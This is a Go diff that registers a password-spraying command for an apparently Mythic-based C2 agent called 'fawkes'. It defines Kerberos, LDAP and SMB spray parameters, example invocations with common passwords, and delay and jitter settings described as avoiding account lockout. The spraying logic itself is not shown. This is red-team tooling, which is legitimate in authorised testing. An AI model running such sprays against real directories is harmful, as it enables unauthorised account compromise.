@@ -1,0 +1,165 @@
+package agentfunctions
+
+import (
+	"fmt"
+	"strings"
+
+	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
+	"github.com/MythicMeta/MythicContainer/mythicrpc"
+)
+
+func init() {
+	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
+		Name:                "spray",
+		Description:         "Password spray against Active Directory via Kerberos pre-auth, LDAP bind, or SMB authentication. Supports configurable delay and jitter to avoid account lockout.",
+		HelpString:          "spray -action kerberos -server 192.168.1.1 -domain CORP.LOCAL -users \"user1\\nuser2\\nuser3\" -password Summer2026!\nspray -action ldap -server dc01 -domain corp.local -users \"admin\\njsmith\" -password Password1 -delay 1000 -jitter 25",
+		Version:             1,
+		Author:              "@galoryber",
+		MitreAttackMappings: []string{"T1110.003"},
+		CommandAttributes: agentstructs.CommandAttribute{
+			SupportedOS: []string{
+				agentstructs.SUPPORTED_OS_WINDOWS,
+				agentstructs.SUPPORTED_OS_LINUX,
+				agentstructs.SUPPORTED_OS_MACOS,
+			},
+		},
+		CommandParameters: []agentstructs.CommandParameter{
+			{
+				Name:             "action",
+				CLIName:          "action",
+				ModalDisplayName: "Protocol",
+				Description:      "Spray protocol: kerberos (AS-REQ pre-auth), ldap (simple bind), smb (NTLM auth)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
+				Choices:          []string{"kerberos", "ldap", "smb"},
+				DefaultValue:     "kerberos",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: true, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "server",
+				CLIName:          "server",
+				ModalDisplayName: "Target Server",
+				Description:      "Domain Controller or target server IP/hostname",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: true, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "domain",
+				CLIName:          "domain",
+				ModalDisplayName: "Domain",
+				Description:      "Domain name (e.g., CORP.LOCAL)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: true, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "users",
+				CLIName:          "users",
+				ModalDisplayName: "Username List",
+				Description:      "Newline-separated list of usernames to spray (e.g., user1\\nuser2\\nuser3)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: true, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "password",
+				CLIName:          "password",
+				ModalDisplayName: "Password",
+				Description:      "Password to spray",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_STRING,
+				DefaultValue:     "",
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: true, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "delay",
+				CLIName:          "delay",
+				ModalDisplayName: "Delay (ms)",
+				Description:      "Delay between authentication attempts in milliseconds (default: 0)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
+				DefaultValue:     0,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "jitter",
+				CLIName:          "jitter",
+				ModalDisplayName: "Jitter (%)",
+				Description:      "Jitter percentage for delay randomization (0-100, default: 0)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
+				DefaultValue:     0,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "port",
+				CLIName:          "port",
+				ModalDisplayName: "Port",
+				Description:      "Custom port (default: 88 for Kerberos, 389/636 for LDAP, 445 for SMB)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
+				DefaultValue:     0,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+			{
+				Name:             "use_tls",
+				CLIName:          "use_tls",
+				ModalDisplayName: "Use TLS",
+				Description:      "Use TLS/LDAPS for LDAP spray (default: false)",
+				ParameterType:    agentstructs.COMMAND_PARAMETER_TYPE_BOOLEAN,
+				DefaultValue:     false,
+				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
+					{ParameterIsRequired: false, GroupName: "Default"},
+				},
+			},
+		},
+		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
+			return args.LoadArgsFromJSONString(input)
+		},
+		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
+			return args.LoadArgsFromDictionary(input)
+		},
+		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
+			response := agentstructs.PTTaskCreateTaskingMessageResponse{
+				Success: true,
+				TaskID:  taskData.Task.ID,
+			}
+
+			action, _ := taskData.Args.GetStringArg("action")
+			server, _ := taskData.Args.GetStringArg("server")
+			domain, _ := taskData.Args.GetStringArg("domain")
+			users, _ := taskData.Args.GetStringArg("users")
+
+			// Count users
+			userCount := 0
+			for _, line := range strings.Split(users, "\n") {
+				if strings.TrimSpace(line) != "" {
+					userCount++
+				}
+			}
+
+			displayMsg := fmt.Sprintf("Spray %s via %s (%s, %d users)", server, action, domain, userCount)
+			response.DisplayParams = &displayMsg
+
+			mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
+				TaskID:           taskData.Task.ID,
+				BaseArtifactType: "API Call",
+				ArtifactMessage:  fmt.Sprintf("Password spray via %s against %s (%d users)", action, server, userCount),
+			})
+
+			return response
+		},
+	})
+}
